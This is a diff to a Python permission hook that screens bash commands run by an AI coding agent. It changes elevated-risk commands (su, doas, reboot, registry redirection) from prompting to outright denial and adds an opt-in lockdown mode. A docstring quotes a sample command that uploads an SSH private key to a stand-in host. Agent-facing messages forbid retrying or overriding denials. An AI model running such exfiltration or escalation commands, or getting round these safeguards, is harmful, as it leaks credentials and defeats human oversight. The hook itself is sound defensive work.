@@ -42,7 +42,6 @@ if TYPE_CHECKING:
 
 from guard._utils import (
     GUARD_STRICT_DENY_QUEUE_PATH,
-    STRICT_PERMISSION_MODES,
     _log_debug,
     append_jsonl,
     log_decision,
@@ -115,10 +114,9 @@ _PIPE_SHELL_CMDS: frozenset[str] = frozenset(
 )
 
 
-_SPEC_DECISION_MAP: dict[str, Literal["allow", "deny", "ask", "pass"]] = {
+_SPEC_DECISION_MAP: dict[str, Literal["allow", "deny", "pass"]] = {
     "allow": "allow",
     "deny": "deny",
-    "ask": "ask",
     "passthrough": "pass",
 }
 
@@ -131,7 +129,8 @@ _REQUEST_CONTEXT: dict[str, Any] = {
     "session_id": "",
     "cwd": None,
     "permission_mode": "default",
-    "mode": "enforce",  # guard mode (enforce|shadow|off) resolved from allowlist at hook entry
+    "mode": "enforce",  # guard mode (enforce|shadow|off|lockdown) resolved from allowlist at hook entry
+    "lockdown": False,  # strict default-deny; set by decide() from guard mode, never permission_mode
 }
 
 # Parsed once from GUARD_ADMIN_ALLOW_VERBS on first call to _get_admin_allow_verbs().
@@ -3544,34 +3543,35 @@ def _is_secret_egress(normalized: str) -> bool:
     return False
 
 
-# === Elevated-risk ask tier ===
-# High harm-capability, low legitimate-frequency commands. Not catastrophic
-# enough for an unconditional both-mode deny, but they must never run SILENTLY:
-# ask the human in interactive mode, hard-deny (with the same specific rule_id)
-# in unattended/strict mode where there's no human to ask. Dispatched from
+# === Elevated-risk tier ===
+# High harm-capability, low legitimate-frequency commands. Not on the
+# catastrophic floor, but they must never run silently: denied in every mode
+# with a specific rule_id and a body that names the safer route, so the agent
+# hands the step to the user instead of retrying. Dispatched from
 # decide() after the both-mode floor and _pre_evaluate_dangerous, before the
 # strict default-deny. The bodies carry the concise why + the safer alternative
 # so an agent self-corrects instead of escalating.
 
-_ESCALATION_ASK_HEADS = {"doas", "pkexec", "su", "runuser", "setpriv"}
+_ESCALATION_HEADS = {"doas", "pkexec", "su", "runuser", "setpriv"}
 
 
-def _is_escalation_ask(normalized: str) -> bool:
+def _is_escalation_shell(normalized: str) -> bool:
     """Return True for non-sudo privilege escalation.
 
     ``doas`` / ``pkexec`` / ``su`` / ``runuser`` / ``setpriv`` plus
     ``machinectl shell`` -- the util-linux / systemd siblings of ``sudo`` that
     open a shell or run as another user. ``sudo`` shells are a both-mode hard
     deny (``_is_sudo_escalation``); these are rarer and occasionally legitimate
-    (a one-off ``su`` to a service account), so they ask rather than deny.
+    (a one-off ``su`` to a service account), so the deny tells the agent to
+    hand the step to the user.
     Escalation hidden behind a pre-exec wrapper (``chroot / su -``,
-    ``flock lock su``) is surfaced by ``_match_ask_tier`` peeling _EXEC_WRAPPERS.
+    ``flock lock su``) is surfaced by ``_match_elevated_risk`` peeling _EXEC_WRAPPERS.
     """
     tokens = normalized.split()
     if not tokens:
         return False
     head = _basename(tokens[0])
-    if head in _ESCALATION_ASK_HEADS:
+    if head in _ESCALATION_HEADS:
         return True
     # ``machinectl shell [user@host]`` opens an interactive shell on the host
     # or a container -- the systemd-nspawn analogue of ``su``.
@@ -3629,7 +3629,7 @@ def _is_registry_poisoning(normalized: str) -> bool:
     yarn, pnpm, bundle analogues; gem ``sources --add``) silently repoints a
     later bare ``install`` at an attacker registry -- a supply-chain vector with
     no URL in the install command itself. Legitimate when pointing at a
-    corporate registry, so it asks rather than denies. A URL value is required
+    corporate registry, so the deny hands the change to the user. A URL value is required
     so ``npm config get registry`` (a read) doesn't match.
     """
     tokens = normalized.split()
@@ -5225,36 +5225,35 @@ def _get_always_deny(segments: list[str]) -> tuple[dict[str, str], str] | None:
     return None
 
 
-# === Elevated-risk ask tier dispatch ===
-# Each entry is (predicate, rule_id, body). decide() routes a hit to an
-# interactive ask or a strict-mode deny (same rule_id/body) -- see the
-# ask-tier block in decide(). rule_ids are stable allowlist keys; register
-# every one in allowlist._BASH_MATCHER_RULE_IDS.
-_ASK_ESCALATION_BODY = (
+# === Elevated-risk tier dispatch ===
+# Each entry is (predicate, rule_id, body). decide() denies a hit in every
+# mode; the body says what to do instead. rule_ids are stable allowlist keys;
+# register every one in allowlist._BASH_MATCHER_RULE_IDS.
+_ESCALATION_BODY = (
     "Non-sudo privilege escalation (doas / pkexec / su). This opens a shell or "
     "runs a command as another user, outside guard's per-command view. If you "
     "need a privileged action, name the specific command rather than dropping "
     "into an escalated shell"
 )
-_ASK_HOST_CONTROL_BODY = (
+_HOST_CONTROL_BODY = (
     "Host power / runlevel control (reboot, shutdown, halt, poweroff, init 0|6, "
     "systemctl power verb). This terminates the session and every running "
     "process; on a shared or remote host it's disruptive and hard to undo. "
-    "Confirm this is the intended machine"
+    "Don't power-cycle the host from the agent: tell the user it needs a "
+    "restart and let them run it"
 )
-_ASK_REGISTRY_BODY = (
+_REGISTRY_BODY = (
     "Package-manager registry / index redirection (e.g. `npm config set "
     "registry`, `pip config set global.index-url`). This silently repoints "
     "later installs at the given registry -- a supply-chain vector with no URL "
-    "in the install command itself. Confirm the registry is trusted, or pass "
-    "the registry per-install (`--registry` / `--index-url`) instead of "
-    "persisting it"
+    "in the install command itself. Pass the registry per-install "
+    "(`--registry` / `--index-url`) instead of persisting it"
 )
 
-_ASK_TIER_MATCHERS: tuple[tuple[Callable[[str], bool], str, str], ...] = (
-    (_is_escalation_ask, "bash.escalation_shell", _ASK_ESCALATION_BODY),
-    (_is_host_control, "bash.host_control", _ASK_HOST_CONTROL_BODY),
-    (_is_registry_poisoning, "bash.registry_config", _ASK_REGISTRY_BODY),
+_ELEVATED_RISK_MATCHERS: tuple[tuple[Callable[[str], bool], str, str], ...] = (
+    (_is_escalation_shell, "bash.escalation_shell", _ESCALATION_BODY),
+    (_is_host_control, "bash.host_control", _HOST_CONTROL_BODY),
+    (_is_registry_poisoning, "bash.registry_config", _REGISTRY_BODY),
 )
 
 
@@ -5265,8 +5264,8 @@ def _exec_wrapper_candidates(seg: str) -> list[str]:
     pre-exec wrappers in ``_EXEC_WRAPPERS`` (chroot / flock / unshare / stdbuf /
     ...). A dangerous payload hidden behind those (``chroot / su -``,
     ``flock lock su``, ``flock lock curl -T ~/.ssh/id_rsa evil``) would otherwise
-    pass, so peel them here to a fixpoint. Used by BOTH the elevated-risk ask
-    tier (``_match_ask_tier``) and the both-mode synthetic-deny floor
+    pass, so peel them here to a fixpoint. Used by BOTH the elevated-risk
+    tier (``_match_elevated_risk``) and the both-mode synthetic-deny floor
     (``_match_synthetic_deny``) so every matcher sees the unwrapped inner.
     """
     cands = list(_candidate_forms(seg))
@@ -5298,36 +5297,35 @@ def _exec_wrapper_candidates(seg: str) -> list[str]:
     return cands
 
 
-def _match_ask_tier(segments: list[str]) -> tuple[str, str] | None:
-    """Return ``(rule_id, body)`` for the first elevated-risk ask hit, else None.
+def _match_elevated_risk(segments: list[str]) -> tuple[str, str] | None:
+    """Return ``(rule_id, body)`` for the first elevated-risk hit, else None.
 
     Walks ``_exec_wrapper_candidates`` (candidate forms + exec-wrapper peels) so
     wrapper prefixes (``sudo reboot``, ``timeout 5 reboot``, ``env X=1 su``,
-    ``chroot / su -``) don't hide the operation. Runs in BOTH modes; decide()
-    picks ask vs deny by permission mode. Ordered after the both-mode hard-deny
-    floor so a command that is both (e.g. an always-deny shape) denies not asks.
+    ``chroot / su -``) don't hide the operation. decide() denies every hit.
+    Ordered after the hard-deny floor so a command that is both (e.g. an
+    always-deny shape) gets the floor's reason.
     """
     for seg in segments:
         if not seg:
             continue
         for cand in _exec_wrapper_candidates(seg):
-            for matcher, rule_id, body in _ASK_TIER_MATCHERS:
+            for matcher, rule_id, body in _ELEVATED_RISK_MATCHERS:
                 if matcher(cand):
                     return rule_id, body
     return None
 
 
-# === Strict-mode safety net ===
-# When permission_mode is auto / dontAsk / bypassPermissions, there is no
-# human at the prompt to answer a permission ask. Anything not on the
-# safe-prefix allowlist is denied with either a STRICT_FEEDBACK message (if
-# the prefix is registered) or a generic default-deny.
+# === Strict-mode safety net (guard mode lockdown) ===
+# Opt-in via ``guard mode lockdown``; Claude Code's permission_mode never
+# turns it on. Anything not on the safe-prefix allowlist is denied with
+# either a STRICT_FEEDBACK message (if the prefix is registered) or a
+# generic default-deny.
 
 DEFAULT_STRICT_DENY_BODY = (
-    "command shape not on safe-prefix allowlist; not allowed without explicit "
-    "user approval. permission_mode auto/dontAsk/bypassPermissions inverts the "
-    "default to deny — if this command is genuinely safe, add a rule to "
-    "guard's registry; otherwise re-run interactively"
+    "command shape not on safe-prefix allowlist. guard lockdown mode denies "
+    "anything it doesn't know is safe. If this command is genuinely safe, add "
+    "a rule to guard's registry; otherwise leave it for the user to run"
 )
 
 
@@ -5789,10 +5787,6 @@ def _deny(reason: str) -> dict[str, str]:
     return {"permissionDecision": "deny", "permissionDecisionReason": reason}
 
 
-def _ask(reason: str) -> dict[str, str]:
-    return {"permissionDecision": "ask", "permissionDecisionReason": reason}
-
-
 _AGENT_GUIDANCE_INTERACTIVE = (
     "Agents: don't apply overrides without asking. Recommended flow: "
     "explain what this rule protects against → propose the specific override "
@@ -5800,7 +5794,7 @@ _AGENT_GUIDANCE_INTERACTIVE = (
 )
 
 _AGENT_GUIDANCE_STRICT = (
-    "Agents: this is a hard fence in strict mode. Do not retry, "
+    "Agents: guard lockdown is on, so this is a hard fence. Do not retry, "
     "do not invoke an override. Surface this deny in your output for the "
     "operator's later review."
 )
@@ -5816,45 +5810,20 @@ def _format_deny_reason(rule_id: str, body: str) -> str:
     quoted shell text into the printed message is error-prone, so the
     user supplies the exact form they want when they invoke the CLI.
 
-    A mode-aware agent-guidance sentence is appended so agents know whether
-    to ask the user (interactive) or surface and stop (strict). The body is
+    An agent-guidance sentence is appended so agents know whether to take
+    it to the user (enforce) or surface and stop (lockdown). The body is
     prefixed with a ``guard [permission_mode=<mode>] denied: <rule_id>``
-    annunciator so reviewers can identify the active mode at a glance.
+    annunciator so reviewers can see the session's permission mode at a
+    glance; the mode is context only and never changes the decision.
     """
     body = body.rstrip(" .")
     mode = _REQUEST_CONTEXT.get("permission_mode") or "default"
-    is_strict = mode in STRICT_PERMISSION_MODES
-    guidance = _AGENT_GUIDANCE_STRICT if is_strict else _AGENT_GUIDANCE_INTERACTIVE
+    lockdown = bool(_REQUEST_CONTEXT.get("lockdown"))
+    guidance = _AGENT_GUIDANCE_STRICT if lockdown else _AGENT_GUIDANCE_INTERACTIVE
     return (
         f"guard [permission_mode={mode}] denied: {rule_id}. {body}. "
         f"Override: `guard allowlist allow-command {rule_id} '<command>' --reason '...'` "
         f"or `guard allowlist disable-rule {rule_id}`. {guidance}"
-    )
-
-
-_AGENT_GUIDANCE_ASK = (
-    "Agents: this is surfaced to the human, not blocked. Don't auto-confirm and "
-    "don't reach for an override -- explain why guard flagged it, prefer the "
-    "safer form if one accomplishes the goal, and let the user answer the prompt."
-)
-
-
-def _format_ask_reason(rule_id: str, body: str) -> str:
-    """Append the rule_id + ask-guidance footer to an elevated-risk ask ``body``.
-
-    The interactive-mode analogue of ``_format_deny_reason``: the command isn't
-    blocked, it's routed to the human for a yes/no. The body carries the concise
-    why plus the safer alternative so the agent can self-correct rather than
-    escalate. Strict mode never reaches this -- it formats the same body through
-    ``_format_deny_reason`` (no human to ask).
-    """
-    body = body.rstrip(" .")
-    mode = _REQUEST_CONTEXT.get("permission_mode") or "default"
-    return (
-        f"guard [permission_mode={mode}] needs approval: {rule_id}. {body}. "
-        f"Override (skip the prompt): "
-        f"`guard allowlist allow-command {rule_id} '<command>' --reason '...'`. "
-        f"{_AGENT_GUIDANCE_ASK}"
     )
 
 
@@ -5977,7 +5946,7 @@ _QUEUE_COMMAND_TRUNC = 500
 _CORPUS_STEER_BODY = (
     "ad-hoc classification probe. Do not spray `guard test '<cmd>'` to check how a command "
     "is classified -- the check evaporates the moment the shell returns, and the next agent "
-    "redoes it. Instead run `guard corpus add '<cmd>' --expect allow|ask|deny [--mode auto]` -- "
+    "redoes it. Instead run `guard corpus add '<cmd>' --expect allow|deny [--mode lockdown]` -- "
     "it appends the case to tests/corpus and adjudicates it in one step, so your case becomes a "
     "permanent regression fixture; `guard corpus` then re-runs the WHOLE set in one process. "
     "See tests/corpus/README.md. (One-off debugging? this fires only inside a guard source "
@@ -6059,24 +6028,26 @@ def decide(
     command: str,
     original_command: str | None = None,
     permission_mode: str = "default",
+    *,
+    lockdown: bool = False,
 ) -> dict[str, str] | None:
     """Decide whether to allow a bash command. ``None`` means passthrough.
 
     ``original_command`` is the unmodified user-typed command string used for
     allowlist exact-match lookups. When ``None``, defaults to ``command``.
 
-    ``permission_mode`` is the documented Claude Code permission mode
-    (``default`` / ``plan`` / ``acceptEdits`` / ``auto`` / ``dontAsk`` /
-    ``bypassPermissions``). Strict modes (``auto``, ``dontAsk``,
-    ``bypassPermissions``) route through default-deny evaluation; all
-    other modes use the advisory evaluator. The value is stamped onto
-    ``_REQUEST_CONTEXT`` so downstream helpers (deny annunciator,
-    agent-guidance selector) can read it without an extra parameter
-    through the call graph.
+    ``permission_mode`` is the documented Claude Code permission mode. It is
+    recorded in deny reasons and the log for context and never changes the
+    decision. ``lockdown`` (guard mode ``lockdown``) routes through strict
+    default-deny evaluation; otherwise only the blocklist applies. Both are
+    stamped onto ``_REQUEST_CONTEXT`` so downstream helpers (deny
+    annunciator, agent-guidance selector) can read them without an extra
+    parameter through the call graph.
     """
     if original_command is None:
         original_command = command
     _REQUEST_CONTEXT["permission_mode"] = permission_mode
+    _REQUEST_CONTEXT["lockdown"] = lockdown
     # Adversarial-length inputs (200 KB single-token ``echo aaaa...``) drive
     # the candidate-forms / fixpoint pipeline into ~10 s of redundant
     # ``shlex.split`` work. Real bash command lines sit far below 8 KiB; deny
@@ -6195,37 +6166,26 @@ def decide(
         _log_local(command, "deny", "harness-steering (bash.use_corpus_harness)")
         return deny
 
-    # === Elevated-risk ask tier ===
+    # === Elevated-risk tier ===
     # High harm-capability / low legitimate-frequency shapes (non-sudo
-    # escalation, host power control, registry redirection). Interactive: ask
-    # the human. Strict (no human at the prompt): deny with the SAME specific
-    # rule_id -- a sharper message than the generic strict default-deny that
-    # would otherwise catch these. Ordered after the both-mode floor so a
-    # command that is also a hard deny denies rather than asks.
-    ask_hit = _match_ask_tier(segments)
-    if ask_hit is not None:
-        rule_id, body = ask_hit
-        if permission_mode in STRICT_PERMISSION_MODES:
-            decision = _deny(
-                _format_deny_reason(rule_id, f"{body} (no human at the prompt in unattended mode)")
-            )
-            outcome = "deny"
-        else:
-            decision = _ask(_format_ask_reason(rule_id, body))
-            outcome = "ask"
+    # escalation, host power control, registry redirection). Denied in every
+    # mode with a specific rule_id and a body that names the safer route.
+    # Ordered after the hard-deny floor so a command that is both gets the
+    # floor's reason.
+    risk_hit = _match_elevated_risk(segments)
+    if risk_hit is not None:
+        rule_id, body = risk_hit
+        decision = _deny(_format_deny_reason(rule_id, body))
         bypass = _maybe_allow_via_allowlist(allowlist, rule_id, original_command, decision)
         if bypass is not None:
             return bypass
-        _log_local(command, outcome, f"ask-tier ({rule_id})")
+        _log_local(command, "deny", f"elevated-risk ({rule_id})")
         return decision
 
-    # === Strict mode: default-deny ===
-    # ``auto`` (Claude Code's classifier-mediated unattended mode), ``dontAsk``
-    # and ``bypassPermissions`` all imply no human at the prompt; anything not
-    # on the safe-prefix allowlist is denied here so the agent gets a
-    # structured rejection (with feedback) instead of a silent passthrough
-    # that would otherwise hang waiting for permission.
-    if permission_mode in STRICT_PERMISSION_MODES:
+    # === Lockdown: default-deny ===
+    # Opt-in via ``guard mode lockdown``. Anything not on the safe-prefix
+    # allowlist is denied with structured feedback.
+    if lockdown:
         return _evaluate_strict(
             command,
             segments,
@@ -6611,7 +6571,7 @@ def _evaluate_strict(
                         unknown = _collect_unknown_flags(spec, raw[1:])
                         if unknown:
                             body = (
-                                f"Unknown flags on admin CLI `{head}` in strict mode:"
+                                f"Unknown flags on admin CLI `{head}` in lockdown:"
                                 f" {', '.join(unknown)}. "
                                 f"{_SYNTH_DENY_REASONS[_SYNTH_ADMIN_UNKNOWN_FLAG_STRICT]}"
                             )
@@ -6694,7 +6654,9 @@ def hook(payload: dict[str, Any]) -> None:
 
     _hard_deny_check(command)
 
-    decision = decide(command, permission_mode=permission_mode)
+    decision = decide(
+        command, permission_mode=permission_mode, lockdown=effective_mode == "lockdown"
+    )
     if decision is None:
         return
 
